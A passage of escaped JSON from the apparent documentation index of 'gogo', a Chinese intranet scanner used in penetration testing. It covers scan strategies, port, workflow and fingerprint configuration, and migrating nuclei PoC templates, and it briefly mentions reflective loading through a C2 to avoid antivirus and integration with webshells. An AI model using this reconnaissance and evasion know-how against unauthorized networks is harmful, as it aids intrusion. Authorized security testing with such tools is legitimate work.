\u56e0\u4e3afscan\u9ed8\u8ba4\u7684\u626b\u63cf\u7b56\u7565\u5f3a\u4f9d\u8d56\u4e8eICMP\u534f\u8bae, \u5e76\u6ca1\u6709\u63d0\u4f9b\u4ee3\u66ff\u65b9\u6848, \u56e0\u6b64\u5bf9\u4f7f\u7528\u8005\u6765\u8bf4, \u6f0f\u6389\u7684\u8fd9\u4e9b\u8d44\u4ea7\u662f\u65e0\u611f\u7684. fscan\u7684\u626b\u63cf\u7b56\u7565\u7c7b\u4f3c<code>-w ss</code>\u6a21\u5f0f\u7684gogo\u7684\u7b2c\u4e00\u9636\u6bb5. </p> <p>\u5982\u679c\u4f7f\u7528<code>gogo -i 172.16.1.1/16 -w snoping</code> \u5219\u53ef\u4ee5\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\u7684\u540c\u65f6\u4fdd\u8bc1\u626b\u63cf\u8017\u65f6\u4e0d\u4f1a\u6709\u6307\u6570\u7ea7\u7684\u63d0\u5347.  \u4f9d\u65e7\u80fd\u5728\u534a\u4e2a\u5c0f\u65f6\u5de6\u53f3\u626b\u5b8c\u4e00\u4e2ab\u6bb5. </p>"},{"location":"gogo/do/#\u6ce8\u610f\u4e8b\u9879","title":"\u6ce8\u610f\u4e8b\u9879","text":"<ol> <li>\u8fd9\u4e2a\u6d41\u7a0b\u5e76\u4e0d\u662f\u6b7b\u677f\u7684\u6807\u51c6\u516c\u5f0f, \u5f88\u591a\u65f6\u5019\u53ef\u4ee5\u5408\u5e76\u5176\u4e2d\u51e0\u4e2a\u6b65\u9aa4, \u5e76\u4e14gogo\u90fd\u5df2\u7ecf\u63d0\u4f9b\u4e86\u5feb\u6377\u7684workflow\u6765\u5e2e\u52a9\u5408\u5e76\u5176\u4e2d\u4efb\u610f\u6b65\u9aa4.</li> <li>\u4efb\u4f55\u626b\u63cf\u884c\u4e3a\u90fd\u6709\u53ef\u80fd\u88ab\u53d1\u73b0, \u9700\u8981\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8bc4\u4f30\u5f53\u524d\u9700\u8981\u8fdb\u884c\u4f55\u79cd\u63a2\u6d4b\u884c\u4e3a</li> <li>\u9ad8\u5e76\u53d1\u7684\u626b\u63cf\u884c\u4e3a\u6709\u53ef\u80fd\u6253\u6302\u5f53\u524d\u670d\u52a1\u5668, \u751a\u81f3\u6253\u6302\u8def\u7531\u5668, \u9700\u8981\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574\u5e76\u53d1\u6570. \u9ed8\u8ba4\u7684linux4000\u5e76\u53d1, windows 1000\u5e76\u53d1\u662f\u591a\u5e74\u7ecf\u9a8c\u5f97\u51fa\u7684\u8f83\u4f18\u89e3.</li> <li>upx\u540e\u7684gogo\u4f53\u79ef\u5927\u7ea6\u4e3a2M</li> </ol>"},{"location":"gogo/do/#\u5176\u4ed6","title":"\u5176\u4ed6","text":"<p>\u4e4b\u540e\u5c06\u4f1a\u4ecb\u7ecd\u6211\u4eec\u66fe\u7ecf\u9047\u5230\u7684\u5404\u79cd\u573a\u666f\u4e0b\u5982\u4f55\u4f7f\u7528gogo.</p> <p>gogo\u8fd8\u63d0\u4f9b\u4e86\u8f83\u4e3a\u5f3a\u5927\u7684\u62d3\u5c55\u80fd\u529b, \u53ef\u4ee5\u6839\u636e\u9700\u6c42\u81ea\u884c\u5b9a\u4e49gogo\u7684\u884c\u4e3a.</p> <p>gogo\u901a\u5e38\u4f5c\u4e3a\u552f\u4e8c(\u53e6\u4e00\u4e2a\u662fshellcode loader)\u9700\u8981\u5728\u5185\u7f51\u843d\u5730\u7684\u5de5\u5177, \u5728\u4e4b\u540e\u6211\u4eec\u4e5f\u4f1a\u63d0\u4f9b\u66f4\u4f18\u7684\u89e3\u51b3\u65b9\u6848\u5b9e\u73b0\u4e0d\u843d\u5730\u60c5\u51b5\u4e0b\u7684\u9ad8\u5e76\u53d1\u626b\u63cf. \u5982\u679c\u4f60\u7684C2\u5b9e\u73b0\u7684\u53cd\u5c04\u52a0\u8f7dPE, gogo\u4e5f\u53ef\u4ee5\u4e0d\u843d\u5730, \u8282\u7701\u4e86\u514d\u6740\u7684\u6210\u672c.</p> <p>gogo\u7684\u626b\u63cf\u7ed3\u679c\u662f\u540e\u7eed\u6e17\u900f\u7684\u6838\u5fc3\u652f\u6491, \u56e0\u6b64\u5c06\u4f1a\u9646\u7eed\u516c\u5f00 \u4e0ewebshell\u7684\u8054\u52a8, \u4e0ecs\u7684\u8054\u52a8, \u4e0e\u5176\u4ed6\u5de5\u5177\u7684\u8054\u52a8\u7684\u89e3\u51b3\u65b9\u6848.</p> <p>\u6700\u540e, \u8bf7\u786e\u4fdd\u5728\u4f7f\u7528gogo\u7684\u65f6\u5019\u5df2\u7ecf\u62ff\u5230\u4e86\u6388\u6743! </p>"},{"location":"gogo/extension/","title":"gogo \u00b7 \u62d3\u5c55","text":"<p>gogo \u4fdd\u7559\u4e86\u5927\u91cf\u53ef\u62d3\u5c55\u63a5\u53e3, \u4f8b\u5982\u6307\u7eb9\u3001poc/exp\u3001\u5de5\u4f5c\u6d41, \u7aef\u53e3\u3002</p> <p>\u8fd9\u4e9b\u9884\u8bbe\u4fdd\u5b58\u5728<code>v2/templates</code>\u76ee\u5f55\u4e0b, \u4ee5yaml\u7684\u5f62\u5f0f\u4fdd\u5b58\u4e0e\u7f16\u8f91, \u4f46\u5728\u7f16\u8bd1\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u8f6c\u4e3aJSON\u5e76\u538b\u7f29\u6253\u5305\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u3002</p> <p>\u7edd\u5927\u90e8\u5206\u63d2\u4ef6\u90fd\u53ef\u4ee5\u4f7f\u73b0\u6709\u7684\u6846\u67b6\u80fd\u5b8c\u6210, \u5982\u679c\u6709\u8f83\u4e3a\u590d\u6742\u7684\u9700\u6c42, \u4f8b\u5982ms17010\u63a2\u6d4b, \u53ef\u4ee5\u5728<code>/v2/internal/plugin</code>\u4e2d\u6dfb\u52a0\u3002</p>"},{"location":"gogo/extension/#\u62d3\u5c55\u7aef\u53e3","title":"\u62d3\u5c55\u7aef\u53e3","text":"<p>\u914d\u7f6e\u6587\u4ef6: <code>v2/templates/port.yaml</code></p> <p>\u7aef\u53e3\u914d\u7f6e\u6700\u4e3a\u7b80\u5355, \u4e0d\u9700\u8981\u8bb2\u89e3\u5c31\u80fd\u7406\u89e3\u3002\u9ed8\u8ba4\u914d\u7f6e\u4e2d\u6709\u5927\u91cf\u6848\u4f8b, \u5982\u679c\u6709\u65b0\u7684\u9ed8\u8ba4\u7aef\u53e3\u9884\u8bbe, \u53ef\u4ee5\u63d0\u4ea4issue\u6216pr, \u6216\u8005\u901a\u8fc7\u793e\u4ea4\u8f6f\u4ef6\u8054\u7cfb\u6211\u3002</p> <p>\u503c\u5f97\u4e00\u63d0\u7684\u662f, <code>name</code>\u4e0e<code>tags</code> \u90fd\u4f1a\u88abgogo\u4f5c\u4e3a<code>-p</code>\u53c2\u6570\u4e0b\u53ef\u9009\u62e9\u7684id, \u4f8b\u5982db\u9884\u8bbe, \u5c31\u662f\u901a\u8fc7tags\u7684\u65b9\u5f0f\u7ed9\u591a\u7ec4\u7aef\u53e3\u90fd\u52a0\u4e0a\u4e86\u8fd9\u4e2atag.\u3002\u901a\u8fc7<code>-p db</code>\u5373\u53ef\u9009\u7528\u6240\u6709\u7684\u6570\u636e\u5e93\u9ed8\u8ba4\u7aef\u53e3\u3002</p> <p>\u4e00\u4e2a\u5b8c\u6574\u7684\u793a\u4f8b</p> <pre><code>- name: top2\n  ports:\n    - '70'\n    - 80-90\n    - '443'\n    - '1080'\n    - 2000-2001\n    - 3000-3001\n    - '1443'\n    - '4443'\n    - '4430'\n    - 5000-5001\n    - '5601'\n    - 6000-6003\n    - 7000-7003\n    - 9000-9003\n    - 8080-8091\n    - 8000-8020\n    - '8820'\n    - '6443'\n    - '8443'\n    - '9443'\n    - '8787'\n    - '7080'\n    - '8070'\n    - '7070'\n    - '7443'\n    - 9080-9083\n    - '5555'\n    - '6666'\n    - '7777'\n    - '9999'\n    - '6868'\n    - '8888'\n    - '8889'\n  type:\n    - http\n    - common\n</code></pre> <p>\u8fd9\u6837\u914d\u7f6e\u7684\u7aef\u53e3\u53ef\u901a\u8fc7<code>-p top2</code> \u6216<code>-p http</code> \u6216<code>-p common</code>\u4e09\u79cd\u65b9\u5f0f\u8c03\u7528\u3002</p> <p>\u53ef\u4ee5\u5728\u6307\u7eb9\u4e2d\u7684<code>default_port</code>\u5b57\u6bb5\u586b\u5199port\u4e2d\u914d\u7f6e\u7684name\u6216tag\u3002</p>"},{"location":"gogo/extension/#\u62d3\u5c55workflow","title":"\u62d3\u5c55workflow","text":"<p>\u914d\u7f6e\u6587\u4ef6: <code>v2/templates/workflows.yaml</code></p> <p>\u4e00\u4e2a\u5b8c\u6574\u7684\u793a\u4f8b, </p> <pre><code>- name: \"192\"         // \u540d\u5b57, \u53ef\u901a\u8fc7--workflow\u8c03\u7528\u7684\u6807\u8bc6\u7b26\n  description: \"\u5bf9192.168.1.1/16\u4f7f\u7528\u5b8c\u6574\u7684\u542f\u53d1\u5f0f\u626b\u63cf\" // \u63cf\u8ff0\n  ip: 192.168.0.0/16  // \u6307\u5b9a\u7684ip\n  iplist:             //\u6307\u5b9a\u7684ip\u5217\u8868, \u4e0eip\u4e8c\u9009\u4e00\n    - 192.168.0.0/16 \n  ports: top2,win,db  // \u7aef\u53e3\u914d\u7f6e, \u4e0e\u547d\u4ee4\u884c\u7528\u6cd5\u76f8\u540c, \u9ed8\u8ba4\u503c 'top1'\n  mod: s              // \u6a21\u5f0f, \u4e0e\u547d\u4ee4\u884c\u7528\u6cd5\u76f8\u540c, \u9ed8\u8ba4\u503c 'default'\n  ping: true          // ping\u542f\u53d1\u63a2\u6d4b,\u7b49\u540c\u4e8e\u547d\u4ee4\u884c\u7684--ping \u9ed8\u8ba4\u503c 'false'\n  no-scan: false      // \u8bbe\u7f6e\u4e3atrue\u5219\u53ea\u8fdb\u884c\u542f\u53d1\u5f0f\u626b\u63cf, \u4e0d\u4f1a\u8fdb\u884c\u7aef\u53e3\u626b\u63cf. \u9ed8\u8ba4\u503c 'false', \u7b49\u540c\u4e8e\u547d\u4ee4\u884c--no\n  ip-probe: default    // ip\u63a2\u9488, \u53ea\u53ef\u4f7f\u7528\u4e8e--mod ss\u7684\u573a\u666f\u4e0b, \u9ed8\u8ba4\u503c 'default', \u7b49\u540c\u4e8e\u547d\u4ee4\u884c\u7684--ipp default\n  port-probe: default  // \u7aef\u53e3\u63a2\u9488, \u53ea\u53ef\u4f7f\u7528\u4e8e\u542f\u53d1\u5f0f\u626b\u63cf\u573a\u666f\u4e0b, \u9ed8\u8ba4\u503c 'default', \u7b49\u540c\u4e8e\u547d\u4ee4\u884c\u7684--sp default\n  exploit: none       // \u662f\u5426\u542f\u7528\u6f0f\u626b, \u9ed8\u8ba4\u503c 'none', \u7b49\u540c\u4e8e\u547d\u4ee4\u884c\u7684-e \u6216 -E  \n  verbose: 0          // \u662f\u5426\u542f\u7528\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b, \u9ed8\u8ba4\u503c '0', \u7b49\u540c\u4e8e-v\n  file: auto          // \u8f93\u51fa\u6587\u4ef6\u4f4d\u7f6e, \u9ed8\u8ba4\u503c 'auto', \u7b49\u540c\u4e8e-f\n  path: .             // \u8f93\u51fa\u6587\u4ef6\u8def\u5f84, \u9ed8\u8ba4\u503c '.', \u7b49\u540c\u4e8e--path\n  tags:               // \u5c06\u591a\u4e2aname\u5212\u5206\u4e3a\u7ec4, \u53ef\u901a\u8fc7--workflow tagname\u5373\u53ef\u8c03\u7528\u591a\u4e2aworkflow\n    - inter\n</code></pre> <p>\u5982\u679c\u6ca1\u6709\u586b\u76f8\u5e94\u7684\u503c, \u5219\u91c7\u7528\u9ed8\u8ba4\u503c\u3002</p> <p>\u5982\u679c\u4f7f\u7528--workflow\u53c2\u6570, \u4f46\u53ea\u60f3\u6539\u53d8\u67d0\u51e0\u4e2a\u53c2\u6570, \u53ef\u76f4\u63a5\u4f7f\u7528--workflow workflowname\u7684\u540c\u65f6, \u4f7f\u7528\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8986\u76d6, \u547d\u4ee4\u884c\u53c2\u6570\u7684\u4f18\u5148\u7ea7\u5927\u4e8eworkflow.</p>"},{"location":"gogo/extension/#\u62d3\u5c55\u6307\u7eb9","title":"\u62d3\u5c55\u6307\u7eb9","text":"<p>\u8bed\u6cd5\u5f15\u64ce\u8be6\u7ec6\u6587\u6863: fingers\u8bed\u6cd5</p> <p>\u5b8c\u6574\u8bf4\u660e:</p> <pre><code>- name: frame   # \u6307\u7eb9\u540d\u5b57, \u5339\u914d\u5230\u7684\u65f6\u5019\u8f93\u51fa\u7684\u503c\n  default_port: # \u6307\u7eb9\u7684\u9ed8\u8ba4\u7aef\u53e3, \u52a0\u901f\u5339\u914d. tcp\u6307\u7eb9\u5982\u679c\u5339\u914d\u5230\u7b2c\u4e00\u4e2a\u5c31\u4f1a\u7ed3\u675f\u6307\u7eb9\u5339\u914d, http\u5219\u4f1a\u7ee7\u7eed\u5339\u914d, \u6240\u4ee5\u9ed8\u8ba4\u7aef\u53e3\u5bf9http\u6ca1\u6709\u7279\u6b8a\u4f18\u5316\n    - '1111'\n  protocol: http  # tcp/http, \u9ed8\u8ba4\u4e3ahttp\n  rule:\n   - version: v1.1.1 # \u53ef\u4e0d\u586b, \u9ed8\u8ba4\u4e3a\u7a7a, \u8868\u793a\u65e0\u5177\u4f53\u7248\u672c\n     regexps: # \u5339\u914d\u7684\u65b9\u5f0f\n        vuln: # \u5339\u914d\u5230vuln\u7684\u6b63\u5219, \u5982\u679c\u5339\u914d\u5230, \u4f1a\u8f93\u51faframework\u4e3aname\u7684\u540c\u65f6, \u8fd8\u4f1a\u6dfb\u52a0vuln\u4e3avuln\u7684\u6f0f\u6d1e\u4fe1\u606f\n          - version:(.*) # vuln\u53ea\u652f\u6301\u6b63\u5219,  \u540c\u65f6\u652f\u6301\u7248\u672c\u53f7\u5339\u914d, \u4f7f\u7528\u62ec\u53f7\u7684\u6b63\u5219\u5206\u7ec4. \u53ea\u652f\u6301\u7b2c\u4e00\u7ec4\n        regexp: # \u5339\u914d\u6307\u7eb9\u6b63\u5219\n          - \"finger.*test\" \n       # \u9664\u4e86\u6b63\u5219, \u8fd8\u652f\u6301\u5176\u4ed6\u7c7b\u578b\u7684\u5339\u914d, \u5305\u62ec\u4ee5\u4e0b\u65b9\u5f0f\n        header: # \u4ec5http\u534f\u8bae\u53ef\u7528, \u5339\u914dheader\u4e2d\u5305\u542b\u7684\u6570\u636e\n          - string\n        body: # \u5305\u542b\u5339\u914d, \u975e\u6b63\u5219\u8868\u8fbe\u5f0f\n          - string\n        md5: # \u5339\u914dbody\u7684md5hash\n          - [md5]\n        mmh3: # \u5339\u914dbody\u7684mmh3hash\n          - [mmh3]\n\n        # \u53ea\u6709\u4e0a\u9762\u89c4\u5219\u4e2d\u7684\u81f3\u5c11\u4e00\u6761\u547d\u4e2d\u624d\u4f1a\u6267\u884cversion\n        version: \n          - version:(.*)  # \u67d0\u4e9b\u60c5\u51b5\u4e0b\u96be\u4ee5\u540c\u65f6\u7f16\u5199\u6307\u7eb9\u7684\u6b63\u5219\u4e0e\u5173\u4e8e\u7248\u672c\u7684\u6b63\u5219, \u53ef\u4ee5\u7279\u5730\u4e3aversion\u5199\u4e00\u6761\u6b63\u5219\n\n     favicon: # favicon\u7684hash\u503c, \u4ec5http\u751f\u6548\n        md5:\n          - f7e3d97f404e71d302b3239eef48d5f2\n        mmh3:\n          - '516963061'\n     level: 1      # 0\u4ee3\u8868\u4e0d\u9700\u8981\u4e3b\u52a8\u53d1\u5305, 1\u4ee3\u8868\u9700\u8981\u989d\u5916\u4e3b\u52a8\u53d1\u8d77\u8bf7\u6c42. \u5982\u679c\u5f53\u524dlevel\u4e3a0\u5219\u4e0d\u4f1a\u53d1\u9001\u6570\u636e, \u4f46\u662f\u4f9d\u65e7\u4f1a\u8fdb\u884c\u88ab\u52a8\u7684\u6307\u7eb9\u5339\u914d.\n     send_data: \"info\\n\" # \u5339\u914d\u6307\u7eb9\u9700\u8981\u4e3b\u52a8\u53d1\u9001\u7684\u6570\u636e\n     vuln: frame_unauthorized # \u5982\u679cregexps\u4e2d\u7684vuln\u547d\u4e2d, \u5219\u4f1a\u8f93\u51fa\u6f0f\u6d1e\u540d\u79f0. \u67d0\u4e9b\u6f0f\u6d1e\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5339\u914d\u5173\u952e\u5b57\u8bc6\u522b, \u56e0\u6b64\u4e00\u4e9b\u7b80\u5355\u7684poc\u4f7f\u7528\u6307\u7eb9\u7684\u65b9\u5f0f\u5b9e\u73b0, \u590d\u6742\u7684poc\u8bf7\u4f7f\u7528-e\u4e0b\u7684nuclei yaml\u914d\u7f6e\n</code></pre>"},{"location":"gogo/extension/#\u6700\u7b80\u6307\u7eb9","title":"\u6700\u7b80\u6307\u7eb9","text":"<p>\u7edd\u5927\u591a\u6570\u4e0b, \u53ea\u9700\u8981\u6dfb\u52a0\u6700\u57fa\u672c\u7684python, \u80fd\u5b9e\u73b0\u6307\u7eb9\u8bc6\u522b. </p> <p>\u5339\u914dbody</p> <pre><code>- name: tomcat\n  rule:\n    - regexps:\n        body:\n          - Apache Tomcat\n</code></pre> <p>\u5339\u914dfavicon</p> <pre><code>- name: Fortinet Fortigate SSL VPN\n  rule:\n    - favicon:\n        mmh3:\n          - '945408572'\n</code></pre>"},{"location":"gogo/extension/#tcp\u6307\u7eb9","title":"TCP\u6307\u7eb9","text":"<p>\u5728gogo\u4e2d\u7684tcp\u6307\u7eb9\u63d2\u4ef6\u5e76\u4e0d\u591a, \u52a0\u8d77\u6765\u4e5f\u53ea\u670920\u6761\u5de6\u53f3\u3002</p> <p>\u5728gogo\u7684\u65e9\u671f\u5f00\u53d1\u4e2d, \u4e00\u5ea6\u60f3\u8fc7\u5c06nmap\u7684\u6307\u7eb9\u5168\u91cf\u79fb\u690d, \u4f46\u5728\u5b9e\u8df5\u4e2d\u53d1\u73b0, server\u6307\u7eb9\u6709\u5927\u91cf\u4e3b\u52a8\u53d1\u5305\u7684\u884c\u4e3a, \u5e76\u4e14\u7edd\u5927\u591a\u6570server\u5b9e\u6218\u4e2d\u5c31\u7b97\u626b\u5230\u4e86\u4e5f\u6ca1\u6709\u6f0f\u6d1e\u53bb\u653b\u51fb. \u4e3a\u6b64, \u6211\u4eec\u60f3\u5230\u4e86\u4e00\u79cd\u4e0d\u9700\u8981\u626b\u63cf\u7684\u6307\u7eb9\u8bc6\u522b\u65b9\u5f0f\u3002</p> <p>\u4e5f\u5c31\u662f\u7ecf\u5e38\u5728gogo\u4e2d\u770b\u5230\u4e86\u6307\u7eb9\u4e2d\u7684guess\u5b57\u6bb5\u3002</p> <p></p> <p>\u8fd9\u4e2a\u5b57\u6bb5\u4ee3\u8868, \u8be5\u6307\u7eb9\u662f\u4ece\u9ed8\u8ba4\u7aef\u53e3\u914d\u7f6e\u4e2d\u731c\u6d4b\u7684, \u800c\u5b9e\u9645\u4e0a, \u9700\u8981\u4e3b\u52a8\u53d1\u5305\u626b\u63cf\u7684\u5927\u591a\u6570\u670d\u52a1\u4e5f\u4e0d\u4f1a\u66f4\u6362\u9ed8\u8ba4\u7aef\u53e3. \u5728\u7ecf\u8fc7\u534a\u5e74\u7684\u4f53\u9a8c\u4ee5\u53ca\u4e00\u4e9b\u5fae\u5c0f\u7684\u8c03\u6574\u540e, \u6211\u4eec\u8ba4\u4e3a\u76ee\u524d\u7684tcp\u6307\u7eb9\u5df2\u7ecf\u80fd\u8986\u76d699%\u7684\u6e17\u900f\u6d4b\u8bd5\u573a\u666f. \u5982\u679c\u6709\u5fc5\u8981\u6dfb\u52a0\u65b0\u7684tcp\u6307\u7eb9, \u6b22\u8fce\u63d0\u4ea4issue.</p> <p>\u4ee5\u8fd9\u4e2ardp\u670d\u52a1\u4e3a\u4f8b\u5b66\u4e60gogo\u4e2d\u5982\u4f55\u7f16\u5199\u4e00\u4e2atcp\u6307\u7eb9.</p> <pre><code>- name: rdp\n  default_port:\n    - rdp\n  protocol: tcp\n  rule:\n    - regexps:\n        regexp:\n          - \"^\\x03\\0\\0\"\n      send_data: b64de|AwAAKiXgAAAAAABDb29raWU6IG1zdHNoYXNoPW5tYXANCgEACAADAAAA\n</code></pre> <p>\u6307\u7eb9\u7684<code>default_port</code>\u53ef\u4ee5\u4f7f\u7528port.yaml\u4e2d\u7684\u914d\u7f6e.</p> <p>port.yaml\u4e2d\u7684rdp:</p> <pre><code>- name: rdp\n  ports:\n    - '3389'\n    - '13389'\n    - '33899'\n    - \"33389\"\n</code></pre> <p>\u975e\u5e38\u65b9\u4fbf\u7684\u914d\u7f6eguess\u89c4\u5219.</p> <p>\u53e6\u5916, rdp\u670d\u52a1\u9700\u8981\u4e3b\u52a8\u53d1\u5305\u624d\u80fd\u83b7\u53d6\u5230\u5f85\u5339\u914d\u7684\u6570\u636e, \u56e0\u6b64, \u8fd8\u9700\u8981\u914d\u7f6esend_data. </p> <p>\u800c\u4e3a\u4e86\u65b9\u4fbf\u5728yaml\u4e2d\u914d\u7f6e\u4e8c\u8fdb\u5236\u7684\u53d1\u5305\u6570\u636e, gogo\u6dfb\u52a0\u4e86\u4e00\u4e9b\u7b80\u5355\u7684\u88c5\u9970\u5668. \u5206\u522b\u4e3a:</p> <ul> <li>b64en , base64\u7f16\u7801</li> <li>b64de , base64\u89e3\u7801</li> <li>hex, hex\u7f16\u7801</li> <li>unhex, hex\u89e3\u7801</li> <li>md5, \u8ba1\u7b97md5</li> </ul> <p>\u5728\u6570\u636e\u7684\u5f00\u5934\u6dfb\u52a0<code>b64de|</code> \u5373\u53ef\u751f\u6548. \u5982\u679c\u6ca1\u6709\u6dfb\u52a0\u4efb\u4f55\u88c5\u9970\u5668, \u6570\u636e\u5c06\u4ee5\u539f\u6837\u53d1\u9001. \u9700\u8981\u6ce8\u610f\u7684\u662fyaml\u89e3\u6790\u540e\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u53ef\u80fd\u4e0d\u662f\u4f60\u770b\u5230\u7684, \u5f3a\u70c8\u5efa\u8bae\u4e8c\u8fdb\u5236\u6570\u636e\u90fd\u4f7f\u7528base64\u6216hex\u7f16\u7801\u540e\u4f7f\u7528.</p> <p>\u8fd9\u6761rdp\u5b9e\u9645\u4e0a\u4e5f\u662f\u4ecenmap\u4e2d\u79fb\u690d\u7684, nmap\u7684\u6307\u7eb9\u4ed3\u5e93\u5728\u8fd9\u91cc: https://github.com/nmap/nmap/blob/master/nmap-service-probes</p> <p>\u5982\u679c\u719f\u6089nmap\u7684\u6307\u7eb9, \u79fb\u690d\u6307\u7eb9\u5e76\u4e0d\u662f\u4e00\u4ef6\u56f0\u96be\u7684\u4e8b\u60c5, \u751a\u81f3\u4e5f\u5df2\u7ecf\u6709\u4e86\u5b8c\u5168\u79fb\u690dnmap\u6307\u7eb9\u5e93\u7684\u9879\u76ee, \u4e0d\u8fc7gogo\u7684tcp\u6307\u7eb9(\u7279\u522b\u662f\u9700\u8981\u4e3b\u52a8\u53d1\u5305\u7684\u6307\u7eb9)\u672a\u6765\u8fd8\u662f\u4f1a\u4fdd\u6301\u5728\u6700\u5c0f\u53ef\u7528\u72b6\u6001, \u9664\u975e\u5fc5\u8981, \u4e0d\u4f1a\u6dfb\u52a0\u4e00\u4e9b\u7528\u4e0d\u5230\u7684\u6307\u7eb9. </p>"},{"location":"gogo/extension/#\u62d3\u5c55poc","title":"\u62d3\u5c55POC","text":"<p>gogo\u7684poc\u91c7\u7528\u4e86nuclei\u7684poc, \u4f46\u5220\u9664\u4e86\u90e8\u5206nuclei\u7684\u8bed\u6cd5. \u4f8b\u5982dsl. \u5e76\u4e14\u6709\u90e8\u5206\u8f83\u65b0\u7684nuclei\u8bed\u6cd5\u6682\u4e0d\u652f\u6301. </p> <p>gogo \u76ee\u524d\u652f\u6301tcp(\u6682\u4e0d\u652f\u6301tls tcp)\u4e0ehttp\u534f\u8bae\u7684\u7edd\u5927\u90e8\u5206nuclei poc</p>"},{"location":"gogo/extension/#gogo\u4e0enuclei\u7f16\u5199poc\u7684\u6ce8\u610f\u4e8b\u9879","title":"gogo\u4e0enuclei\u7f16\u5199poc\u7684\u6ce8\u610f\u4e8b\u9879","text":"<p>nuclei \u5b98\u65b9\u7684poc\u7f16\u5199\u6559\u7a0b https://nuclei.projectdiscovery.io/templating-guide/</p> <p>gogo\u5e38\u7528\u4e8e\u7279\u6b8a\u73af\u5883\u4e0b, \u56e0\u6b64\u5220\u9664\u4e86\u8bb8\u591anuclei\u539f\u6709\u7684\u529f\u80fd, \u4f8b\u5982dsl, oast\u4ee5\u53ca\u9664\u4e86http\u4e0etcp\u534f\u8bae\u4e4b\u5916\u7684\u6f0f\u6d1e\u63a2\u6d4b.</p> <p>nuclei\u66f4\u65b0\u8f83\u5feb, \u4e00\u822c\u60c5\u51b5\u4e0bgogo\u4f1a\u843d\u540enuclei\u6700\u65b0\u7248\u51e0\u4e2a\u6708, \u6240\u4ee5\u5efa\u8bae\u53ea\u4f7f\u7528\u57fa\u672c\u7684\u89c4\u5219, \u7f16\u5199\u6700\u7b80\u7684poc, \u4fdd\u8bc1\u517c\u5bb9\u6027.</p> <p>\u660e\u786e\u5220\u9664\u5e76\u4e14\u540e\u7eed\u4e0d\u4f1a\u6dfb\u52a0\u7684\u529f\u80fd</p> <p>\u90e8\u5206\u529f\u80fd\u4f1a\u4ee5\u7b80\u5316\u7684\u5f62\u5f0f\u91cd\u65b0\u52a0\u5165\u5230gogo\u4e2d</p> <ol> <li>oast\u4e0eOOB,\u8fd9\u7c7b\u9700\u8981\u5916\u5e26\u7684\u529f\u80fd, \u53ef\u4ee5\u901a\u8fc7\u63a2\u6d4b\u63a5\u53e3\u662f\u5426\u5b58\u5728\u505a\u4e00\u4e2a\u5927\u81f4\u7684\u5339\u914d.</li> <li>workflow, \u901a\u8fc7chain\u7b80\u5355\u4ee3\u66ff</li> <li>info\u4e2d\u7684\u5927\u591a\u6570\u4fe1\u606f, \u53ea\u4fdd\u7559\u6700\u57fa\u672c\u7684\u4fe1\u606f, \u5e76\u4e14\u4e0d\u4f1a\u8f93\u51fa, \u5efa\u8bae\u53ea\u4fdd\u7559name, tag, severity\u4e09\u4e2a\u5b57\u6bb5</li> <li>pipeline</li> <li>Race conditions</li> <li>\u9664\u4e86regex\u4e4b\u5916\u7684extractor. \u56e0\u4e3a\u5f15\u5165\u591a\u4e2a\u89e3\u6790\u5e93\u5bb9\u6613\u4f1a\u53d8\u5f97\u81c3\u80bf</li> </ol> <p>\u6682\u65f6\u4e0d\u652f\u6301\u7684\u529f\u80fd, \u4f46\u5728\u8ba1\u5212\u8868\u4e2d\u7684\u529f\u80fd</p> <ul> <li> cookie reuse</li> <li> http redirect</li> <li> variables  \uff08\u5df2\u652f\u6301\u81ea\u5b9a\u4e49payloads, \u529f\u80fd\u7c7b\u4f3cvariables\uff09</li> <li> Helper Functions (\u5df2\u652f\u6301\u5b8c\u6574\u7684dsl\u5f15\u64ce)</li> </ul> <p>nuclei\u4e2d\u6ca1\u6709, \u53ea\u80fd\u5728gogo\u4e2d\u4f7f\u7528\u7684\u529f\u80fd</p> <ol> <li>finger\u5b57\u6bb5, \u80fd\u7ed1\u5b9afinger, \u63d0\u4f9b\u9664\u4e86tag\u4e4b\u5916\u7684\u7ed1\u5b9afinger\u529e\u6cd5\uff0c\u5141\u8bb8\u5199\u5165\u591a\u4e2afinger</li> </ol> <pre><code>id: poc-id\nfinger: \n  - fingername1\n  - fingername2\n</code></pre> <ol> <li>chain\u5b57\u6bb5, \u5982\u679cmatch\u6210\u529f\u540e\u4f1a\u6267\u884c\u7684poc</li> </ol> <pre><code>id: poc-id\nchain: \u5176\u4ed6poc id\n</code></pre> <ol> <li>\u901a\u8fc7\u547d\u4ee4\u884c\u53c2\u6570\u66ff\u6362yaml\u4e2d\u7684payload, \u540e\u7eed\u5c06\u4f1a\u652f\u6301\u4ece\u6587\u4ef6\u4e2d\u8bfb\u5217\u8868 </li> </ol>"},{"location":"gogo/extension/#\u4ecenuclei-templates-\u8fc1\u79fbpoc","title":"\u4ecenuclei templates \u8fc1\u79fbpoc","text":"<p>https://github.com/projectdiscovery/nuclei-templates</p> <p>\u5927\u90e8\u5206poc\u4ec5\u9700\u7b80\u5355\u4fee\u6539\u5373\u53ef\u5728gogo\u4e2d\u4f7f\u7528.</p> <p>\u793a\u4f8b  \u8fc1\u79fbapollo-login poc \u5230gogo</p> <p>https://github.com/projectdiscovery/nuclei-templates/blob/d6636f9169920d3ccefc692bc1a6136e2deb9205/default-logins/apollo/apollo-default-login.yaml</p> <p></p> <p>\u8fd9\u4e2apoc\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u5220\u51cf\u548c\u6539\u52a8. </p> <ol> <li>\u5220\u9664\u4e00\u4e9bheader\u4fe1\u606f, \u5e76\u4e14\u6839\u636egogo\u7684\u6307\u7eb9\u91cd\u65b0\u6dfb\u52a0tags</li> <li>\u51cf\u5c11\u4e0d\u5fc5\u8981\u7684\u53d1\u5305, apollo\u5b9e\u9645\u4e0a\u53ea\u9700\u8981\u7b2c\u4e00\u4e2asignin\u7684\u5305\u5373\u53ef\u786e\u5b9a\u662f\u5426\u6210\u529f</li> <li>dsl\u5728gogo\u4e2d\u5df2\u5220\u9664, \u56e0\u4e3adsl\u4e0d\u662f\u5fc5\u8981\u529f\u80fd, 